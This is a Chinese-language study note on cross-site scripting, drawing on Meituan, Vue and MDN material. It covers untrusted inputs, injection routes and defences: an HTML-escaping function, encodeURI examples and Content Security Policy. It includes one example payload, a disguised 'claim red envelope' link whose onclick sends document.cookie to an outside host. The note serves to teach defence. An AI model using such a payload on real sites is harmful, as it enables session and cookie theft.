https://tech.meituan.com/2018/09/27/fe-security.html

## Cross-Site Scripting XSS

跨站脚本 (Cross-Site Scripting, XSS): 一种代码注入攻击, 为了与 CSS 区分所以被称作 XSS. 



XSS的本质是：恶意代码未经过过滤，与网站的正常代码混在一起，利用浏览器对于内容的信任，执行了恶意代码

不可信任的信息

- 用户的UGC信息 （User Gnerate Content）
- 第三方的链接
- URL参数



例子🌰

```html
<a href="#" onclick=`window.location=http://abc.comcookie=${docuemnt.cookie}`>领取红包</a>
```



要素

1. 攻击者提交恶意代码。
2. 浏览器执行恶意代码。



有哪些注入的方法？

- script
- 拼接的数据超出了原本的限制🚫
- 在标签的 href、src 等属性中，包含 `javascript:` 等可执行代码。



所以不能讲拿到的string直接作为html插入

> Vue v-html
>
> <p>Using mustaches: {{ rawHtml }}</p> <p>Using v-html directive: <span v-html="rawHtml"></span></p>
>
> 你的站点上动态渲染的任意 HTML 可能会非常危险，因为它很容易导致 [XSS 攻击](https://en.wikipedia.org/wiki/Cross-site_scripting)。请只对可信内容使用 HTML 插值，**绝不要**对用户提供的内容使用插值。



关于一些浏览器API

### [textContent Differences from innerHTML](https://developer.mozilla.org/en-US/docs/Web/API/Node/textContent#differences_from_innerhtml)

[`Element.innerHTML`](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML) returns HTML, as its name indicates. Sometimes people use `innerHTML` to retrieve or write text inside an element, but `textContent` has better performance because its value is not parsed as HTML.

Moreover, using `textContent` can prevent [XSS attacks](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting).

Don't get confused by the differences between `Node.textContent` and [`HTMLElement.innerText`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/innerText). Although the names seem similar, there are important differences:

- `textContent` gets the content of *all* elements, including [``](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script) and [``](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/style) elements. In contrast, `innerText` only shows “human-readable” elements.
- `textContent`returns every element in the node. In contrast,`innerText`is aware of styling and won’t return the text of “hidden” elements.
  - Moreover, since `innerText` takes CSS styles into account, reading the value of `innerText` triggers a [reflow](https://developer.mozilla.org/en-US/docs/Glossary/Reflow) to ensure up-to-date computed styles. (Reflows can be computationally expensive, and thus should be avoided when possible.)



## 如何防御？

转义输入输出的内容，对于引号，尖括号，斜杠进行转义

```js
function escape(str) {
  str = str.replace(/&/g, '&amp;')
  str = str.replace(/</g, '&lt;')
  str = str.replace(/>/g, '&gt;')
  str = str.replace(/"/g, '&quto;')
  str = str.replace(/'/g, '&#39;')
  str = str.replace(/`/g, '&#96;')
  str = str.replace(/\//g, '&#x2F;')
  return str
}
```

富文本考虑白名单转义



```js
var set1 = ";,/?:@&=+$";  // Reserved Characters
var set2 = "-_.!~*'()";   // Unescaped Characters
var set3 = "#";           // Number Sign
var set4 = "ABC abc 123"; // Alphanumeric Characters + Space

console.log(encodeURI(set1)); // ;,/?:@&=+$
console.log(encodeURI(set2)); // -_.!~*'()
console.log(encodeURI(set3)); // #
console.log(encodeURI(set4)); // ABC%20abc%20123 (the space gets encoded as %20)

console.log(encodeURIComponent(set1)); // %3B%2C%2F%3F%3A%40%26%3D%2B%24
console.log(encodeURIComponent(set2)); // -_.!~*'()
console.log(encodeURIComponent(set3)); // %23
console.log(encodeURIComponent(set4)); // ABC%20abc%20123 (the space gets encoded as %20)
```



### 还有个方案是[CSP](https://content-security-policy.com/) Content Security Policy

The Content-Security-Policy header allows you to restrict how resources such as JavaScript, CSS, or pretty much anything that the browser loads.

To enable CSP, you need to configure your web server to return the [`Content-Security-Policy`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) HTTP header. 

Alternatively, the [``](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta) element can be used to configure a policy, for example: `<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">`

- 禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。

